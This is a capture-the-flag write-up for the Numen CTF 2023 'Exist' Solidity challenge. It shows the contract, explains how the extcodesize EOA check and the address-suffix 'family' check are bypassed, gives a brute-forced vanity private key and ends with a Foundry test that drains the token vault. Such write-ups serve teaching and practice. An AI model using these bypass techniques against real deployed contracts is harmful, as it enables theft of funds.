# Numen CTF 2023 : Exist

### Contract code :
```solidity
pragma solidity ^0.6.12;

contract Existing{

	string public name = "Existing";
	string public symbol = "EG";
	uint256 public decimals = 18;
	uint256 public totalSupply = 10000000;
    bool public flag = false;

    mapping(address=>bool)public status;

    event SendFlag(address addr);

    mapping(address => uint) public balanceOf;

    bytes20 internal appearance = bytes20(bytes32("ZT"))>>144;
    bytes20 internal maskcode = bytes20(uint160(0xffff));

    constructor()public{ 
        balanceOf[address(this)] += totalSupply;
    }

    function transfer(address to,uint amount) external {
        _transfer(msg.sender,to,amount);
    }

    function _transfer(address from,address to,uint amount) internal {
        require(balanceOf[from] >= amount,"amount exceed");
        require(to != address(0),"you cant burn my token");
        require(balanceOf[to]+amount >= balanceOf[to]);
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }

    modifier only_family{
        require(is_my_family(msg.sender),
        "no no no,my family only");
        _;
    }

    modifier only_EOA(address msgs){
        uint x;
        assembly { 
            x := extcodesize(msgs) 
            }
        require(x == 0,"Only EOA can do that");
        _;
    } 

    function is_my_family(address account) internal returns (bool) {
        bytes20 you = bytes20(account);

        bytes20 code = maskcode;
        bytes20 feature = appearance;

        for (uint256 i = 0; i < 34; i++) {
            if (you & code == feature) {
                return true;
            }

            code <<= 4;
            feature <<= 4;
        }
        return false;
    }

    function share_my_vault() external only_EOA(msg.sender) only_family {
        uint256 add = balanceOf[address(this)];
        _transfer(address(this),msg.sender,add);
    }

    function setflag() external{
        if(balanceOf[msg.sender] >= totalSupply) {
            flag = true;
        }
    }
    function isSolved() external view returns(bool) {
        
        return flag;
    }
}
```

The goal is to get all of the token balance from the contract and set `flag` to true

There is a `share_my_vault()` function that all token balance from the contract to us, but it has 2 modifiers

`only_EOA` checks that our address is an EOA by checking extcodesize, it can be bypassed with code in constructor

`only_family` will check the 4 least significant hex digit of our address and see if it equals `5a54`, if it equals then `is_my_family` returns true, if not then it will shift 4 bits to the left and check again and loop for 34 times

So we can just bruteforce a vanity address ending with `5a54` with python

```
Private key : 0x59584503f6378b330aea2c0a50a1a3e42ec905f5e545adf2651497ccda96b39b
Address : 0xAE1ff4a16b798B585c81Fcec9Df7378F69155A54
```

## Foundry test :
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/create2.sol";

contract existTest is Test {
    Existing public exist;
    address hacker = vm.addr(0x59584503f6378b330aea2c0a50a1a3e42ec905f5e545adf2651497ccda96b39b);

    function setUp() public {
        exist = new Existing();
    }

    function testSolved() public {
        vm.startPrank(hacker);
        
        exist.share_my_vault();
        exist.setflag();
        
        assertTrue(exist.isSolved());
    }
}
```